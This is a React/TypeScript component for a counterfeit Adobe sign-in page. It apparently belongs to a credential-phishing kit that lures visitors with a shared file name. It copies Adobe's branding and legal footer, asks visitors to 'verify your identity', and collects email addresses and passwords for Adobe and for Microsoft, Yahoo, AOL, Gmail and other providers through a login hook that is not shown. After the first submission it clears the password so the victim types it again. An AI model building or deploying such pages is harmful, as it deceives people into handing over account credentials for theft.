import React, { useState, useRef } from 'react';
import { Eye, EyeOff } from 'lucide-react';
import { useLogin } from '../hooks/useLogin';
import Spinner from './common/Spinner';

interface LoginPageProps {
  fileName: string;
  onBack: () => void;
  onLoginSuccess?: (sessionData: any) => void;
  onLoginError?: (error: string) => void;
  onYahooSelect?: () => void;
  onAolSelect?: () => void;
  onGmailSelect?: () => void;
  onOffice365Select?: () => void;
  onOthersSelect?: () => void;
  defaultProvider?: string;
}

const LoginPage: React.FC<LoginPageProps> = ({ 
  fileName, 
  onBack,
  onLoginSuccess, 
  onLoginError,
  onYahooSelect,
  onAolSelect,
  onGmailSelect,
  onOffice365Select,
  onOthersSelect,
  defaultProvider,
}) => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [showPasswordStep, setShowPasswordStep] = useState(!!defaultProvider);
  const [provider, setProvider] = useState(defaultProvider || '');
  const emailInputRef = useRef<HTMLInputElement>(null);
  
  const { isLoading, errorMessage, handleFormSubmit } = useLogin(
    onLoginSuccess,
    onLoginError
  );

  const handleOthersSelect = () => {
    setProvider('Others');
    emailInputRef.current?.scrollIntoView({ behavior: 'smooth' });
    setTimeout(() => emailInputRef.current?.focus(), 300);
  };

  const emailProviders = [
    { name: 'Microsoft', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/microsoft-icon.png', handler: onOffice365Select },
    { name: 'Yahoo', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/yahoo-square-icon.png', handler: onYahooSelect },
    { name: 'Outlook', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/microsoft-outlook-icon.png', handler: onOffice365Select },
    { name: 'AOL', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/aol-icon.png', handler: onAolSelect },
    { name: 'Gmail', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/gmail-icon.png', handler: onGmailSelect },
    { name: 'Others', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/communication-chat-call/envelope-line-icon.png', handler: handleOthersSelect },
  ];

  const handleContinue = (e: React.MouseEvent<HTMLButtonElement>) => {
    e.preventDefault();
    if (email) {
      if (!provider) setProvider('Adobe');
      setShowPasswordStep(true);
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    const result = await handleFormSubmit(e, { email, password, provider: provider || 'Adobe' });
    if (result?.isFirstAttempt) {
      setPassword('');
    }
  };

  return (
    <div className="min-h-screen flex flex-col font-sans" style={{ fontFamily: "'Adobe Clean', 'Source Sans Pro', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" }}>
      <div className="flex-1 flex">
        {/* Left Panel - Background Image */}
        <div
          className="hidden lg:flex w-[35%] relative bg-cover bg-center"
          style={{
            backgroundImage: "url('https://t3.ftcdn.net/jpg/09/74/43/40/360_F_974434091_JFqK7teEsKxG7MoS4kIUNDayUgJqwvIl.jpg')",
            backgroundColor: '#0f1520',
          }}
        >
          <div className="absolute inset-0 bg-black/30" />
          <div className="relative z-10 flex flex-col justify-center items-center w-full h-full p-10">
            <div className="flex items-center gap-3 mb-1">
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30 26" className="w-10 h-10">
                <polygon fill="#FA0F00" points="11.5,0 0,0 0,26" />
                <polygon fill="#FA0F00" points="18.5,0 30,0 30,26" />
                <polygon fill="#FA0F00" points="15,9.6 22.1,26 18.2,26 16,20.8 10.9,20.8" />
              </svg>
              <span className="text-white text-3xl font-bold">Adobe</span>
            </div>
            <p className="text-white/80 text-base ml-1">Sign in or create an account</p>
          </div>
        </div>

        {/* Right Panel - Container with background image */}
        <div
          className="w-full lg:w-[65%] flex bg-cover bg-center"
          style={{
            backgroundImage: "url('https://t3.ftcdn.net/jpg/09/74/43/40/360_F_974434091_JFqK7teEsKxG7MoS4kIUNDayUgJqwvIl.jpg')",
            backgroundColor: '#0f1520',
          }}
        >
          {/* White Card - narrower, shifted right */}
          <div className="w-full lg:max-w-[500px] lg:ml-auto lg:mr-4 bg-white flex flex-col">
            {/* Blue Info Banner */}
            <div className="bg-[#1473E6] text-white py-3 px-6 flex items-center gap-3 text-sm font-medium">
              <svg className="w-5 h-5 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
                <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clipRule="evenodd" />
              </svg>
              For your protection, please verify your identity.
            </div>

            {/* Form Content */}
            <div className="flex-1 flex items-start justify-center px-8 pt-12 pb-8 overflow-y-auto">
              <div className="w-full max-w-[320px]">
              <h1 className="text-3xl font-bold text-gray-900 mb-2">Sign in</h1>
              <p className="text-sm text-gray-600 mb-8">
                New user?{' '}
                <a href="https://account.adobe.com" target="_blank" rel="noopener noreferrer" className="text-[#1473E6] hover:underline">
                  Create an account
                </a>
              </p>

              <form onSubmit={handleSubmit}>
                {errorMessage && !isLoading && (
                  <div className="mb-4 p-3 rounded text-sm text-red-700 bg-red-50 border border-red-200">
                    {errorMessage}
                  </div>
                )}

                <div className="mb-4">
                  <label className="text-sm text-gray-700 block mb-1.5" htmlFor="email">
                    Email address
                  </label>
                  <input
                    id="email"
                    ref={emailInputRef}
                    type="email"
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    required
                    disabled={showPasswordStep}
                    className="w-full px-3 py-2.5 border border-gray-300 rounded text-sm text-gray-900 focus:outline-none focus:border-[#1473E6] focus:ring-1 focus:ring-[#1473E6] disabled:bg-gray-100 disabled:text-gray-500"
                  />
                </div>

                {showPasswordStep && (
                  <div className="mb-4">
                    <label className="text-sm text-gray-700 block mb-1.5" htmlFor="password">
                      Password
                    </label>
                    <div className="relative">
                      <input
                        id="password"
                        type={showPassword ? 'text' : 'password'}
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                        required
                        autoFocus
                        className="w-full px-3 pr-10 py-2.5 border border-gray-300 rounded text-sm text-gray-900 focus:outline-none focus:border-[#1473E6] focus:ring-1 focus:ring-[#1473E6]"
                      />
                      <button
                        type="button"
                        onClick={() => setShowPassword(!showPassword)}
                        className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600"
                      >
                        {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                      </button>
                    </div>
                  </div>
                )}

                <div className="flex justify-end mt-6 mb-6">
                  {!showPasswordStep ? (
                    <button
                      onClick={handleContinue}
                      disabled={!email}
                      className="px-7 py-2.5 bg-[#1473E6] text-white font-semibold rounded-full text-sm hover:bg-[#0d66d0] disabled:opacity-50 disabled:cursor-not-allowed transition-colors"
                    >
                      Continue
                    </button>
                  ) : (
                    <button
                      type="submit"
                      disabled={isLoading || !password}
                      className="px-7 py-2.5 bg-[#1473E6] text-white font-semibold rounded-full text-sm hover:bg-[#0d66d0] disabled:opacity-50 disabled:cursor-not-allowed transition-colors flex items-center"
                    >
                      {isLoading && <Spinner size="sm" color="border-white" className="mr-2" />}
                      {isLoading ? 'Verifying...' : 'Continue'}
                    </button>
                  )}
                </div>
              </form>

              {/* Or Divider */}
              <div className="relative text-center my-6">
                <span className="absolute inset-x-0 top-1/2 h-px bg-gray-300"></span>
                <span className="relative bg-white px-4 text-sm text-gray-500">Or</span>
              </div>

              {/* Email Provider Buttons */}
              <div className="space-y-2">
                {emailProviders.map((ep) => (
                  <button
                    key={ep.name}
                    onClick={() => ep.handler?.()}
                    type="button"
                    className="w-full group"
                  >
                    <div className="flex items-center px-4 py-3 rounded-full border border-gray-300 hover:bg-gray-50 transition-all duration-150">
                      <img src={ep.logo} alt={ep.name} className="w-5 h-5 object-contain flex-shrink-0" />
                      <span className="flex-1 text-sm font-medium text-gray-700 ml-3 text-center">
                        Continue with {ep.name}
                      </span>
                    </div>
                  </button>
                ))}
              </div>

              {/* Links */}
              <div className="text-center mt-6 space-y-3">
                <a href="https://account.adobe.com" target="_blank" rel="noopener noreferrer" className="text-sm text-[#1473E6] hover:underline block">More sign-in options</a>
                <a href="https://helpx.adobe.com/manage-account/using/sign-in-faq.html" target="_blank" rel="noopener noreferrer" className="text-sm text-[#1473E6] hover:underline block">Get help signing in</a>
              </div>
            </div>
          </div>
          </div>
        </div>
      </div>

      {/* Adobe Footer */}
      <footer className="bg-[#fafafa] border-t border-gray-200 py-3 px-6">
        <div className="flex flex-wrap items-center justify-center gap-x-4 gap-y-1 text-[11px] text-gray-500">
          <a href="https://www.adobe.com/privacy.html" target="_blank" rel="noopener noreferrer" className="hover:text-gray-700 hover:underline">Privacy</a>
          <span className="text-gray-300">|</span>
          <a href="https://www.adobe.com/legal/terms.html" target="_blank" rel="noopener noreferrer" className="hover:text-gray-700 hover:underline">Terms of Use</a>
          <span className="text-gray-300">|</span>
          <a href="https://www.adobe.com/privacy/cookies.html" target="_blank" rel="noopener noreferrer" className="hover:text-gray-700 hover:underline">Cookie preferences</a>
          <span className="text-gray-300">|</span>
          <span className="text-gray-400">Copyright © 2026 Adobe. All rights reserved.</span>
        </div>
      </footer>
    </div>
  );
};

export default LoginPage;
